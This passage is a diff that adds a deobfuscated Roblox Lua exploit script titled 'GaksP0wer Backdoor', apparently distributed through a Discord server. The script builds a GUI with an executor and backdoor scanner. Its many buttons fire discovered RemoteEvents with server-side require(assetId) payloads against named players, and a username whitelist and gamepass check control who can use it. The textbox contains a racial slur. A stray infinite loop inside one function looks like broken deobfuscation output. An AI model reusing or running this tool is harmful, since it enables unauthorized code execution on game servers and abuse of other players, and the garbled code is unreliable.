@@ -1,0 +1,2388 @@
+-- This file was generated at discord.gg/syncrypt
+-- MoonVeil Deobfuscator Created By Skynex Okinbru
+
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local TweenService, LocalPlayer, RobotoMono, t2, Sound, ScreenGui, v13, v14
+
+do
+	local MarketplaceService
+
+	do
+		local Players = game:GetService("Players")
+
+		MarketplaceService = game:GetService("MarketplaceService")
+		game:GetService("Debris")
+		TweenService = game:GetService("TweenService")
+		LocalPlayer = Players.LocalPlayer
+	end
+
+	RobotoMono = Enum.Font.RobotoMono
+
+	local t1 = {
+		1733467745,
+		1745993057,
+	}
+
+	t2 = {
+		"Tuber93fb",
+		"c00lkidd79087",
+		"musababa_53",
+	}
+
+	if makefolder then
+		pcall(function()
+			makefolder("GaksP0werBackdoorSaves")
+		end)
+	end
+
+	Sound = Instance.new("Sound")
+	Sound.SoundId = "rbxassetid://6895079853"
+	Sound.Volume = 0.8
+	Sound.Parent = game:GetService("CoreGui")
+	ScreenGui = Instance.new("ScreenGui")
+	ScreenGui.Name = "Backdoor"
+	local u12 = nil
+	pcall(function()
+		u12 = gethui()
+	end)
+
+	if true then
+		pcall(function()
+			u12 = game:GetService("CoreGui")
+		end)
+	end
+
+	ScreenGui.Parent = u12 or LocalPlayer:WaitForChild("PlayerGui")
+	v13 = false
+	v14 = table.find(t2, LocalPlayer.Name)
+
+	if not v14 then
+		for _, v in ipairs(t1) do
+			local _pcall = pcall
+			local u18 = MarketplaceService
+			local u19 = LocalPlayer
+			local u20 = v
+			local v21, v22 = pcall(function()
+				return u18:UserOwnsGamePassAsync(u19.UserId, u20)
+			end)
+
+			if v21 and v22 then
+				v13 = true
+
+				break
+			end
+		end
+	end
+end
+
+if v13 or v14 then
+	local t3, v26, Frame, Frame2, v84, TextBox, u89, v133, v134, v135, TextLabel, v206
+
+	do
+		local v30, Frame3, Frame4, v91
+
+		do
+			local Frame5
+
+			do
+				local ScrollingFrame, v143, Frame6, TextBox4, TextBox5, v154
+
+				do
+					local Frame7
+
+					do
+						local ScrollingFrame2, v96
+
+						do
+							do
+								do
+									local u70, u71
+
+									do
+										local Frame8, Frame9, TextButton, ImageButton
+
+										do
+											do
+												do
+													local Frame10
+
+													do
+														do
+															do
+																do
+																	do
+																		t3 = {
+																			Main = Color3.fromRGB(255, 180, 50),
+																			FrameBg = Color3.fromRGB(255, 145, 0),
+																			InnerBg = Color3.fromRGB(255, 170, 60),
+																			BtnBg = Color3.fromRGB(255, 190, 80),
+																			Text = Color3.fromRGB(255, 255, 255),
+																			DarkOrange = Color3.fromRGB(200, 100, 0),
+																		}
+																	end
+
+																	local u25 = UserInputService
+
+																	function v26(p1)
+																		local u294 = nil
+																		local u295 = nil
+																		local u296 = nil
+																		do
+																			u294 = nil
+																			u295 = nil
+																			u296 = nil
+																			local InputBegan = p1.InputBegan
+																			local u298 = p1
+																			InputBegan:Connect(function(p2)
+																				if
+																					p2.UserInputType ~= Enum.UserInputType.MouseButton1
+																					and p2.UserInputType ~= Enum.UserInputType.Touch
+																				then
+																					return
+																				end
+																				do
+																					u294 = true
+																					u295 = p2.Position
+																				end
+
+																				u296 = u298.Position
+
+																				local Changed = p2.Changed
+																				local u493 = p2
+
+																				Changed:Connect(function()
+																					if u493.UserInputState == Enum.UserInputState.End then
+																						u294 = false
+																					end
+																				end)
+																			end)
+																			local n1 = 1
+																		end
+
+																		local InputChanged = u25.InputChanged
+																		local u300 = p1
+
+																		InputChanged:Connect(function(p3)
+																			if
+																				not u294
+																				or p3.UserInputType ~= Enum.UserInputType.MouseMovement
+																					and p3.UserInputType ~= Enum.UserInputType.Touch
+																			then
+																				return
+																			end
+
+																			local v489 = p3.Position - u295
+
+																			u300.Position = UDim2.new(
+																				u296.X.Scale,
+																				u296.X.Offset + v489.X,
+																				u296.Y.Scale,
+																				u296.Y.Offset + v489.Y
+																			)
+																		end)
+																	end
+																end
+
+																local u27 = TweenService
+																local u28 = t3
+																local u29 = Sound
+
+																function v30(p4)
+																	local UIScale = Instance.new("UIScale", p4)
+																	local MouseEnter = p4.MouseEnter
+																	local u304 = p4
+
+																	MouseEnter:Connect(function()
+																		u27:Create(u304, TweenInfo.new(0.2), {
+																			BackgroundColor3 = u28.DarkOrange,
+																		}):Play()
+																	end)
+
+																	local MouseLeave = p4.MouseLeave
+																	local u306 = p4
+
+																	MouseLeave:Connect(function()
+																		u27:Create(u306, TweenInfo.new(0.2), {
+																			BackgroundColor3 = u28.BtnBg,
+																		}):Play()
+																	end)
+
+																	local MouseButton1Down = p4.MouseButton1Down
+																	local u308 = UIScale
+
+																	MouseButton1Down:Connect(function()
+																		u29:Play()
+																		u27:Create(u308, TweenInfo.new(0.1), {
+																			Scale = 0.9,
+																		}):Play()
+																	end)
+
+																	local MouseButton1Up = p4.MouseButton1Up
+																	local u310 = UIScale
+
+																	MouseButton1Up:Connect(function()
+																		u27:Create(u310, TweenInfo.new(0.1), {
+																			Scale = 1,
+																		}):Play()
+																	end)
+																end
+															end
+
+															Frame = Instance.new("Frame")
+															Frame.Size = UDim2.new(0, 700, 0, 450)
+															Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+															Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+															Frame.BackgroundColor3 = t3.FrameBg
+															Frame.Visible = false
+															Frame.Parent = ScreenGui
+															Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)
+															v26(Frame)
+
+															local UIStroke = Instance.new("UIStroke")
+
+															UIStroke.Thickness = 3
+															UIStroke.Parent = Frame
+
+															local spawn = task.spawn
+															local u34 = UIStroke
+															local u35 = RunService
+
+															spawn(function()
+																local n3 = 0
+
+																while true do
+																	n3 = n3 + 0.0025
+
+																	if n3 > 1 then
+																		n3 = 0
+																	end
+
+																	local color3 = Color3.fromHSV(n3, 0.8, 1)
+
+																	if not u34:IsA("UIStroke") or u34.Name == "FixedOutline" then
+																		if
+																			(u34:IsA("TextLabel") or u34:IsA("TextButton") or u34:IsA("TextBox"))
+																			and u34.Name == "RainbowText"
+																		then
+																			u34.TextColor3 = color3
+																		end
+																	else
+																		u34.Color = color3
+																	end
+
+																	u35.RenderStepped:Wait()
+																end
+															end)
+														end
+
+														Frame10 = Instance.new("Frame")
+														Frame10.Size = UDim2.new(0, 160, 1, 0)
+														Frame10.BackgroundColor3 = t3.InnerBg
+														Frame10.BorderSizePixel = 0
+														Frame10.Parent = Frame
+
+														local UICorner = Instance.new("UICorner")
+
+														UICorner.CornerRadius = UDim.new(0, 12)
+														UICorner.Parent = Frame10
+
+														local Frame11 = Instance.new("Frame")
+
+														Frame11.Size = UDim2.new(0, 10, 1, 0)
+														Frame11.Position = UDim2.new(1, -10, 0, 0)
+														Frame11.BackgroundColor3 = t3.InnerBg
+														Frame11.BorderSizePixel = 0
+														Frame11.Parent = Frame10
+
+														local ImageLabel = Instance.new("ImageLabel")
+
+														ImageLabel.Size = UDim2.new(0, 80, 0, 80)
+														ImageLabel.Position = UDim2.new(0.5, -40, 0, 10)
+														ImageLabel.BackgroundTransparency = 1
+														ImageLabel.Image = "rbxassetid://77341125261508"
+														ImageLabel.Parent = Frame10
+													end
+
+													local TextLabel4 = Instance.new("TextLabel")
+
+													TextLabel4.Size = UDim2.new(1, 0, 0, 30)
+													TextLabel4.Position = UDim2.new(0, 0, 0, 95)
+													TextLabel4.BackgroundTransparency = 1
+													TextLabel4.Text = "GaksP0wer Backdoor"
+													TextLabel4.Name = "RainbowText"
+													TextLabel4.Font = Enum.Font.GothamBold
+													TextLabel4.TextSize = 16
+													TextLabel4.Parent = Frame10
+
+													local spawn = task.spawn
+													local u42 = TextLabel4
+													local u43 = RunService
+
+													spawn(function()
+														local n4 = 0
+
+														while true do
+															n4 = n4 + 0.0025
+
+															if n4 > 1 then
+																n4 = 0
+															end
+
+															local color3 = Color3.fromHSV(n4, 0.8, 1)
+
+															if not u42:IsA("UIStroke") or u42.Name == "FixedOutline" then
+																if
+																	(u42:IsA("TextLabel") or u42:IsA("TextButton") or u42:IsA("TextBox"))
+																	and u42.Name == "RainbowText"
+																then
+																	u42.TextColor3 = color3
+																end
+															else
+																u42.Color = color3
+															end
+
+															u43.RenderStepped:Wait()
+														end
+													end)
+													Frame8 = Instance.new("Frame")
+													Frame8.Size = UDim2.new(1, 0, 1, -140)
+													Frame8.Position = UDim2.new(0, 0, 0, 130)
+													Frame8.BackgroundTransparency = 1
+													Frame8.Parent = Frame10
+												end
+
+												local UIListLayout = Instance.new("UIListLayout")
+
+												UIListLayout.Parent = Frame8
+												UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+												UIListLayout.Padding = UDim.new(0, 10)
+												Frame9 = Instance.new("Frame")
+												Frame9.Size = UDim2.new(1, -160, 1, 0)
+												Frame9.Position = UDim2.new(0, 160, 0, 0)
+												Frame9.BackgroundTransparency = 1
+												Frame9.Parent = Frame
+												TextButton = Instance.new("TextButton")
+												TextButton.Size = UDim2.new(0, 32, 0, 32)
+												TextButton.Position = UDim2.new(0, 0, 0, 10)
+												TextButton.BackgroundColor3 = t3.BtnBg
+												TextButton.Text = "-"
+												TextButton.Font = RobotoMono
+												TextButton.TextColor3 = t3.Text
+												TextButton.TextSize = 35
+												TextButton.ZIndex = 10
+												TextButton.Parent = Frame
+												Instance.new("UICorner", TextButton)
+
+												local UIStroke = Instance.new("UIStroke")
+
+												UIStroke.Thickness = 2.5
+												UIStroke.Parent = TextButton
+
+												local spawn = task.spawn
+												local u50 = UIStroke
+												local u51 = RunService
+
+												spawn(function()
+													local n5 = 0
+
+													while true do
+														n5 = n5 + 0.0025
+
+														if n5 > 1 then
+															n5 = 0
+														end
+
+														local color3 = Color3.fromHSV(n5, 0.8, 1)
+
+														if not u50:IsA("UIStroke") or u50.Name == "FixedOutline" then
+															if
+																(u50:IsA("TextLabel") or u50:IsA("TextButton") or u50:IsA("TextBox"))
+																and u50.Name == "RainbowText"
+															then
+																u50.TextColor3 = color3
+															end
+														else
+															u50.Color = color3
+														end
+
+														u51.RenderStepped:Wait()
+													end
+												end)
+											end
+
+											v30(TextButton)
+											ImageButton = Instance.new("ImageButton")
+											ImageButton.Size = UDim2.new(0, 60, 0, 60)
+											ImageButton.Position = UDim2.new(1, -70, 1, -70)
+											ImageButton.BackgroundColor3 = t3.FrameBg
+											ImageButton.Image = "rbxassetid://77341125261508"
+											ImageButton.Visible = false
+											ImageButton.Parent = ScreenGui
+											Instance.new("UICorner", ImageButton).CornerRadius = UDim.new(1, 0)
+
+											local UIStroke = Instance.new("UIStroke")
+
+											UIStroke.Thickness = 3
+											UIStroke.Parent = ImageButton
+
+											local spawn = task.spawn
+											local u55 = UIStroke
+											local u56 = RunService
+
+											spawn(function()
+												local n6 = 0
+
+												while true do
+													n6 = n6 + 0.0025
+
+													if n6 > 1 then
+														n6 = 0
+													end
+
+													local color3 = Color3.fromHSV(n6, 0.8, 1)
+
+													if not u55:IsA("UIStroke") or u55.Name == "FixedOutline" then
+														if
+															(u55:IsA("TextLabel") or u55:IsA("TextButton") or u55:IsA("TextBox"))
+															and u55.Name == "RainbowText"
+														then
+															u55.TextColor3 = color3
+														end
+													else
+														u55.Color = color3
+													end
+
+													u56.RenderStepped:Wait()
+												end
+											end)
+
+											local RenderStepped = RunService.RenderStepped
+											local u58 = ImageButton
+
+											RenderStepped:Connect(function()
+												if u58.Visible then
+													u58.Rotation = u58.Rotation + 0.3 + 0
+												end
+											end)
+										end
+
+										local MouseButton1Click = TextButton.MouseButton1Click
+										local u60 = Frame
+										local u61 = ImageButton
+
+										MouseButton1Click:Connect(function()
+											u60.Visible = false
+											u61.Visible = true
+										end)
+
+										local MouseButton1Click2 = ImageButton.MouseButton1Click
+										local u63 = Frame
+										local u64 = ImageButton
+
+										MouseButton1Click2:Connect(function()
+											u63.Visible = true
+											u64.Visible = false
+										end)
+										Frame7 = Instance.new("Frame", Frame9)
+										Frame7.Size = UDim2.new(1, 0, 1, 0)
+										Frame7.BackgroundTransparency = 1
+										Frame7.Visible = true
+										Frame5 = Instance.new("Frame", Frame9)
+										Frame5.Size = UDim2.new(1, 0, 1, 0)
+										Frame5.BackgroundTransparency = 1
+										Frame5.Visible = false
+										Frame3 = Instance.new("Frame", Frame9)
+										Frame3.Size = UDim2.new(1, 0, 1, 0)
+										Frame3.BackgroundTransparency = 1
+										Frame3.Visible = false
+										Frame2 = Instance.new("Frame", Frame9)
+										Frame2.Size = UDim2.new(1, 0, 1, 0)
+										Frame2.BackgroundTransparency = 1
+										Frame2.Visible = false
+										Frame4 = Instance.new("Frame", Frame9)
+										Frame4.Size = UDim2.new(1, 0, 1, 0)
+										Frame4.BackgroundTransparency = 1
+										Frame4.Visible = false
+										u70 = t3
+										u71 = Frame8
+									end
+
+									local u72 = RunService
+									local u73 = v30
+									local u74 = Frame3
+									local u75 = Frame2
+									local u76 = Frame4
+									local u77 = Frame7
+									local u78 = Frame5
+
+									local function v79(p5, p6)
+										local TextButton = Instance.new("TextButton")
+
+										TextButton.Size = UDim2.new(0.85, 0, 0, 40)
+										TextButton.BackgroundColor3 = u70.BtnBg
+										TextButton.Text = p5
+										TextButton.Font = Enum.Font.GothamBold
+										TextButton.TextSize = 14
+										TextButton.TextColor3 = u70.Text
+										TextButton.Parent = u71
+										Instance.new("UICorner", TextButton)
+
+										local UIStroke = Instance.new("UIStroke")
+
+										UIStroke.Thickness = 2
+										UIStroke.Parent = TextButton
+
+										local spawn = task.spawn
+										local u324 = UIStroke
+
+										spawn(function()
+											local n7 = 0
+
+											while true do
+												n7 = n7 + 0.0025
+
+												if n7 > 1 then
+													n7 = 0
+												end
+
+												local color3 = Color3.fromHSV(n7, 0.8, 1)
+
+												if not u324:IsA("UIStroke") or u324.Name == "FixedOutline" then
+													if
+														(u324:IsA("TextLabel") or u324:IsA("TextButton") or u324:IsA("TextBox"))
+														and u324.Name == "RainbowText"
+													then
+														u324.TextColor3 = color3
+													end
+												else
+													u324.Color = color3
+												end
+
+												u72.RenderStepped:Wait()
+											end
+										end)
+										u73(TextButton)
+
+										local MouseButton1Click = TextButton.MouseButton1Click
+										local u326 = p6
+
+										MouseButton1Click:Connect(function()
+											do
+												u77.Visible = false
+												u78.Visible = false
+												u74.Visible = false
+												u75.Visible = false
+											end
+
+											u76.Visible = false
+											u326.Visible = true
+										end)
+									end
+
+									v79("Executor", Frame7)
+									v79("Customs SS", Frame5)
+									v79("GUI Builder", Frame3)
+									v79("Scanner Build", Frame2)
+									v79("Realm Creator", Frame4)
+
+									local u80 = RobotoMono
+									local u81 = t3
+									local u82 = RunService
+									local u83 = v30
+
+									function v84(p7, p8, p9, p10, p11)
+										local TextButton = Instance.new("TextButton")
+
+										TextButton.Text = p7
+										TextButton.Position = p8
+										TextButton.Size = p9
+										TextButton.Font = u80
+										TextButton.TextScaled = true
+										TextButton.BackgroundColor3 = u81.BtnBg
+										TextButton.BorderSizePixel = 0
+										TextButton.Parent = p10
+										Instance.new("UICorner", TextButton).CornerRadius = UDim.new(0, 8)
+
+										local UIStroke = Instance.new("UIStroke")
+
+										UIStroke.Thickness = 2.5
+										UIStroke.Parent = TextButton
+										UIStroke.Name = (p11 == "scan" or p11 == "visual") and "FixedOutline" or "RainbowOutline"
+
+										if p11 ~= "visual" then
+											if p11 ~= "scan" then
+												local spawn = task.spawn
+												local u335 = TextButton
+
+												spawn(function()
+													local n9 = 0
+
+													while true do
+														n9 = n9 + 0.0025
+
+														if n9 > 1 then
+															n9 = 0
+														end
+
+														local color3 = Color3.fromHSV(n9, 0.8, 1)
+
+														if not u335:IsA("UIStroke") or u335.Name == "FixedOutline" then
+															if
+																(u335:IsA("TextLabel") or u335:IsA("TextButton") or u335:IsA("TextBox"))
+																and u335.Name == "RainbowText"
+															then
+																u335.TextColor3 = color3
+															end
+														else
+															u335.Color = color3
+														end
+
+														u82.RenderStepped:Wait()
+													end
+												end)
+												task.spawn(function()
+													local n10 = 0
+
+													while true do
+														n10 = n10 + 0.0025
+
+														if n10 > 1 then
+															n10 = 0
+														end
+
+														local color3 = Color3.fromHSV(n10, 0.8, 1)
+
+														if not UIStroke:IsA("UIStroke") or UIStroke.Name == "FixedOutline" then
+															if
+																(UIStroke:IsA("TextLabel") or UIStroke:IsA("TextButton") or UIStroke:IsA("TextBox"))
+																and UIStroke.Name == "RainbowText"
+															then
+																UIStroke.TextColor3 = color3
+															end
+														else
+															UIStroke.Color = color3
+														end
+
+														u82.RenderStepped:Wait()
+													end
+												end)
+											else
+												UIStroke.Enabled = false
+
+												local spawn = task.spawn
+												local u337 = TextButton
+
+												spawn(function()
+													local n11 = 0
+
+													while true do
+														n11 = n11 + 0.0025
+
+														if n11 > 1 then
+															n11 = 0
+														end
+
+														local color3 = Color3.fromHSV(n11, 0.8, 1)
+
+														if not u337:IsA("UIStroke") or u337.Name == "FixedOutline" then
+															if
+																(u337:IsA("TextLabel") or u337:IsA("TextButton") or u337:IsA("TextBox"))
+																and u337.Name == "RainbowText"
+															then
+																u337.TextColor3 = color3
+															end
+														else
+															u337.Color = color3
+														end
+
+														u82.RenderStepped:Wait()
+													end
+												end)
+											end
+										else
+											local spawn = task.spawn
+											local u339 = TextButton
+
+											spawn(function()
+												local n12 = 0
+
+												while true do
+													n12 = n12 + 0.0025
+
+													if n12 > 1 then
+														n12 = 0
+													end
+
+													local color3 = Color3.fromHSV(n12, 0.8, 1)
+
+													if not u339:IsA("UIStroke") or u339.Name == "FixedOutline" then
+														if
+															(u339:IsA("TextLabel") or u339:IsA("TextButton") or u339:IsA("TextBox"))
+															and u339.Name == "RainbowText"
+														then
+															u339.TextColor3 = color3
+														end
+													else
+														u339.Color = color3
+													end
+
+													u82.RenderStepped:Wait()
+												end
+											end)
+											UIStroke.Color = u81.DarkOrange
+										end
+
+										u83(TextButton)
+
+										return TextButton
+									end
+								end
+
+								local Frame12 = Instance.new("Frame", Frame7)
+
+								Frame12.Size = UDim2.new(0.65, 0, 0.7, 0)
+								Frame12.Position = UDim2.new(0.05, 0, 0.04999999999999716, 0)
+								Frame12.BackgroundColor3 = t3.InnerBg
+								Instance.new("UICorner", Frame12)
+								TextBox = Instance.new("TextBox")
+								TextBox.Size = UDim2.new(1, -10, 1, -10)
+								TextBox.Position = UDim2.new(0, 5, 0, 5)
+								TextBox.BackgroundTransparency = 1
+								TextBox.Font = RobotoMono
+								TextBox.TextSize = 14
+								TextBox.ClearTextOnFocus = false
+								TextBox.MultiLine = true
+								TextBox.Text = "-- Execute Or Close It Niga"
+								TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+								TextBox.TextXAlignment = 0
+								TextBox.TextYAlignment = 0
+								TextBox.Parent = Frame12
+								ScrollingFrame2 = Instance.new("ScrollingFrame")
+								ScrollingFrame2.Size = UDim2.new(0.25, 0, 0.7, 0)
+								ScrollingFrame2.Position = UDim2.new(0.72, 0, 0.049999999999954525, 0)
+								ScrollingFrame2.BackgroundColor3 = t3.InnerBg
+								ScrollingFrame2.BorderSizePixel = 0
+								ScrollingFrame2.Parent = Frame7
+								ScrollingFrame2.ScrollBarThickness = 4
+								ScrollingFrame2.CanvasSize = UDim2.new(0, 0, 2.5, 0)
+								Instance.new("UICorner", ScrollingFrame2)
+
+								local UIListLayout = Instance.new("UIListLayout")
+
+								UIListLayout.Parent = ScrollingFrame2
+								UIListLayout.Padding = UDim.new(0, 5)
+								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+								u89 = nil
+
+								local u90 = LocalPlayer
+
+								function v91(p12)
+									if not u89 then
+										game:GetService("StarterGui"):SetCore("SendNotification", {
+											Title = "Error",
+											Text = "Scan First!",
+											Duration = 4,
+										})
+
+										return
+									end
+
+									local u341 = string.format(p12, u90.Name)
+
+									pcall(function()
+										if not u89:IsA("RemoteEvent") then
+											task.spawn(function()
+												u89:InvokeServer(u341)
+											end)
+
+											return
+										end
+
+										u89:FireServer(u341)
+									end)
+								end
+
+								local u92 = t3
+								local u93 = RunService
+								local u94 = v30
+								local u95 = RobotoMono
+
+								function v96(p13, p14)
+									local TextButton = nil
+									do
+										TextButton = Instance.new("TextButton")
+										TextButton.Text = p13
+										TextButton.Size = UDim2.new(0.9, 0, 0, 35)
+										TextButton.Font = u95
+										TextButton.TextScaled = true
+										TextButton.BackgroundColor3 = u92.BtnBg
+										TextButton.BorderSizePixel = 0
+										TextButton.Parent = p14
+									end
+
+									Instance.new("UICorner", TextButton).CornerRadius = UDim.new(0, 8)
+
+									local spawn = task.spawn
+									local u347 = TextButton
+
+									spawn(function()
+										local n14 = 0
+
+										while true do
+											n14 = n14 + 0.0025
+
+											if n14 > 1 then
+												n14 = 0
+											end
+
+											local color3 = Color3.fromHSV(n14, 0.8, 1)
+
+											if not u347:IsA("UIStroke") or u347.Name == "FixedOutline" then
+												if (u347:IsA("TextLabel") or u347:IsA("TextButton") or u347:IsA("TextBox")) and u347.Name == "RainbowText" then
+													u347.TextColor3 = color3
+												end
+											else
+												u347.Color = color3
+											end
+
+											u93.RenderStepped:Wait()
+										end
+									end)
+									u94(TextButton)
+
+									return TextButton
+								end
+
+								local MouseButton1Click = v96("Re", ScrollingFrame2).MouseButton1Click
+								local u98 = v91
+
+								MouseButton1Click:Connect(function()
+									u98('game.Players["%s"]:LoadCharacter()')
+								end)
+
+								local MouseButton1Click3 = v96("R6", ScrollingFrame2).MouseButton1Click
+								local u100 = v91
+
+								MouseButton1Click3:Connect(function()
+									u100('require(3436957371):r6("%s")')
+								end)
+
+								local MouseButton1Click4 = v96("Rejoin Others", ScrollingFrame2).MouseButton1Click
+								local u102 = v91
+
+								MouseButton1Click4:Connect(function()
+									u102('require(82243016822828).epic("%s")')
+								end)
+							end
+
+							local MouseButton1Click = v96("Exser", ScrollingFrame2).MouseButton1Click
+							local u104 = v91
+
+							MouseButton1Click:Connect(function()
+								u104('require(74482062740292):pls("%s")')
+							end)
+
+							local MouseButton1Click5 = v96("GaksP0wer Ultra V2", ScrollingFrame2).MouseButton1Click
+							local u106 = v91
+
+							MouseButton1Click5:Connect(function()
+								u106('require(128859079780498).gaksp0werultramultramegaepochahayezzzzzzzzzzzdontskidv125783727384hahaepic("%s")')
+							end)
+
+							local MouseButton1Click6 = v96("DualSword", ScrollingFrame2).MouseButton1Click
+							local u108 = v91
+
+							MouseButton1Click6:Connect(function()
+								u108('require(2946060158):Fire("%s", "hack")')
+							end)
+
+							local MouseButton1Click7 = v96("HappyHub SS", ScrollingFrame2).MouseButton1Click
+							local u110 = v91
+
+							MouseButton1Click7:Connect(function()
+								u110('require(91634974327476):Hload("%s")')
+							end)
+
+							local MouseButton1Click8 = v96("John Doe", ScrollingFrame2).MouseButton1Click
+							local u112 = v91
+
+							MouseButton1Click8:Connect(function()
+								u112('require(2845929020).ooga("%s")')
+							end)
+
+							local MouseButton1Click9 = v96("Hammer", ScrollingFrame2).MouseButton1Click
+							local u114 = v91
+
+							MouseButton1Click9:Connect(function()
+								u114('require(8038037940).CLoad("%s")')
+							end)
+
+							local MouseButton1Click10 = v96("Stand", ScrollingFrame2).MouseButton1Click
+							local u116 = v91
+
+							MouseButton1Click10:Connect(function()
+								u116('require(5098731275).eliza("%s")')
+							end)
+						end
+
+						local MouseButton1Click = v96("C4", ScrollingFrame2).MouseButton1Click
+						local u118 = v91
+
+						MouseButton1Click:Connect(function()
+							u118('require(0x1767bf813)("%s")')
+						end)
+
+						local MouseButton1Click11 = v96("Crane", ScrollingFrame2).MouseButton1Click
+						local u120 = v91
+
+						MouseButton1Click11:Connect(function()
+							u120('require(16857604287)("%s")')
+						end)
+
+						local MouseButton1Click12 = v96("Cool SS", ScrollingFrame2).MouseButton1Click
+						local u122 = v91
+
+						MouseButton1Click12:Connect(function()
+							u122('require(6896725229).ok("%s")')
+						end)
+
+						local MouseButton1Click13 = v96("Rc7", ScrollingFrame2).MouseButton1Click
+						local u124 = v91
+
+						MouseButton1Click13:Connect(function()
+							u124('require(12350030542).RC7("%s")')
+						end)
+
+						local MouseButton1Click14 = v96("Realm", ScrollingFrame2).MouseButton1Click
+						local u126 = v91
+
+						MouseButton1Click14:Connect(function()
+							u126('require(90228108280236).lol("%s")')
+						end)
+
+						local MouseButton1Click15 = v96("GaksP0wer Fe Gui", ScrollingFrame2).MouseButton1Click
+						local u128 = v91
+
+						MouseButton1Click15:Connect(function()
+							u128('require(111072316091989).feguibygaksp0werdontskid("%s")')
+						end)
+
+						local MouseButton1Click16 = v96("Giant Eye", ScrollingFrame2).MouseButton1Click
+						local u130 = v91
+
+						MouseButton1Click16:Connect(function()
+							u130('require(5375399205).Player("%s")')
+						end)
+					end
+
+					local Frame13 = Instance.new("Frame", Frame7)
+
+					Frame13.Size = UDim2.new(0.92, 0, 0, 45)
+					Frame13.Position = UDim2.new(0.05, 0, 0.78, 0)
+					Frame13.BackgroundTransparency = 1
+
+					local UIListLayout = Instance.new("UIListLayout", Frame13)
+
+					UIListLayout.FillDirection = Enum.FillDirection.Horizontal
+					UIListLayout.Padding = UDim.new(0, 15)
+					v133 = v84("CLEAR", UDim2.new(0, 0, 0, 0), UDim2.new(0, 140, 1, 0), Frame13)
+					v134 = v84("AUTO FILL", UDim2.new(0, 0, 0, 0), UDim2.new(0, 140, 1, 0), Frame13)
+					v135 = v84("EXECUTE", UDim2.new(0, 0, 0, 0), UDim2.new(0, 140, 1, 0), Frame13)
+					ScrollingFrame = Instance.new("ScrollingFrame")
+					ScrollingFrame.Size = UDim2.new(0.9200000000000159, 0, 0, 48)
+					ScrollingFrame.Position = UDim2.new(0.05, 0, 0.8849999999999909, 0)
+					ScrollingFrame.BackgroundColor3 = t3.InnerBg
+					ScrollingFrame.ScrollBarThickness = 6
+					ScrollingFrame.Parent = Frame7
+					ScrollingFrame.CanvasSize = UDim2.new(2, 0, 0, 0)
+					Instance.new("UICorner", ScrollingFrame)
+
+					local UIListLayout2 = Instance.new("UIListLayout")
+
+					UIListLayout2.Parent = ScrollingFrame
+					UIListLayout2.FillDirection = Enum.FillDirection.Horizontal
+					UIListLayout2.Padding = UDim.new(0, 8)
+					UIListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center
+
+					local u138 = t3
+					local u139 = ScrollingFrame
+					local u140 = RunService
+					local u141 = v30
+					local u142 = RobotoMono
+
+					function v143(p15, p16)
+						local TextButton = nil
+						do
+							TextButton = Instance.new("TextButton")
+							TextButton.Size = UDim2.new(0, 120, 0, 45)
+							TextButton.BackgroundColor3 = u138.BtnBg
+							TextButton.Text = p15
+							TextButton.Font = u142
+							TextButton.TextScaled = true
+							TextButton.TextColor3 = u138.Text
+							TextButton.Parent = u139
+							Instance.new("UICorner", TextButton)
+							local spawn = task.spawn
+							local u354 = TextButton
+							spawn(function()
+								local n16 = 0
+
+								while true do
+									n16 = n16 + 0.0025
+
+									if n16 > 1 then
+										n16 = 0
+									end
+
+									local color3 = Color3.fromHSV(n16, 0.8, 1)
+
+									if not u354:IsA("UIStroke") or u354.Name == "FixedOutline" then
+										if (u354:IsA("TextLabel") or u354:IsA("TextButton") or u354:IsA("TextBox")) and u354.Name == "RainbowText" then
+											u354.TextColor3 = color3
+										end
+									else
+										u354.Color = color3
+									end
+
+									u140.RenderStepped:Wait()
+								end
+							end)
+							u141(TextButton)
+							local MouseButton1Click = TextButton.MouseButton1Click
+							local u356 = p16
+							local u357 = p15
+							MouseButton1Click:Connect(function()
+								if not u89 then
+									game:GetService("StarterGui"):SetCore("SendNotification", {
+										Title = "Error",
+										Text = "Scan First!",
+										Duration = 4,
+									})
+
+									return
+								end
+
+								pcall(function()
+									if not u89:IsA("RemoteEvent") then
+										task.spawn(function()
+											u89:InvokeServer(u356)
+										end)
+
+										return
+									end
+
+									u89:FireServer(u356)
+								end)
+
+								game:GetService("StarterGui"):SetCore("SendNotification", {
+									Title = "Executed!",
+									Text = u357,
+									Duration = 4,
+								})
+							end)
+							while true do
+								continue
+							end
+						end
+
+						local MouseButton2Click = TextButton.MouseButton2Click
+						local u359 = p15
+
+						MouseButton2Click:Connect(function()
+							if not delfile then
+								return
+							end
+
+							pcall(function()
+								delfile("GaksP0werBackdoorSaves" .. "/" .. u359 .. ".txt")
+							end)
+							TextButton:Destroy()
+						end)
+					end
+
+					Frame6 = Instance.new("Frame")
+					Frame6.Size = UDim2.new(0, 350, 0, 250)
+					Frame6.Position = UDim2.new(0.5, -175, 0.5, -125)
+					Frame6.BackgroundColor3 = t3.FrameBg
+					Frame6.Visible = false
+					Frame6.ZIndex = 5
+					Frame6.Parent = ScreenGui
+					Instance.new("UICorner", Frame6).CornerRadius = UDim.new(0, 12)
+					v26(Frame6)
+
+					local UIStroke = Instance.new("UIStroke")
+
+					UIStroke.Thickness = 3
+					UIStroke.Parent = Frame6
+
+					local spawn = task.spawn
+					local u147 = UIStroke
+					local u148 = RunService
+
+					spawn(function()
+						local n17 = 0
+
+						while true do
+							n17 = n17 + 0.0025
+
+							if n17 > 1 then
+								n17 = 0
+							end
+
+							local color3 = Color3.fromHSV(n17, 0.8, 1)
+
+							if not u147:IsA("UIStroke") or u147.Name == "FixedOutline" then
+								if (u147:IsA("TextLabel") or u147:IsA("TextButton") or u147:IsA("TextBox")) and u147.Name == "RainbowText" then
+									u147.TextColor3 = color3
+								end
+							else
+								u147.Color = color3
+							end
+
+							u148.RenderStepped:Wait()
+						end
+					end)
+					TextBox4 = Instance.new("TextBox")
+					TextBox4.Size = UDim2.new(0.9, 0, 0, 40)
+					TextBox4.Position = UDim2.new(0.05, 0, 0, 45)
+					TextBox4.BackgroundColor3 = Color3.fromRGB(255, 200, 100)
+					TextBox4.ZIndex = 6
+					TextBox4.Font = RobotoMono
+					TextBox4.PlaceholderText = "File Name"
+					TextBox4.Text = ""
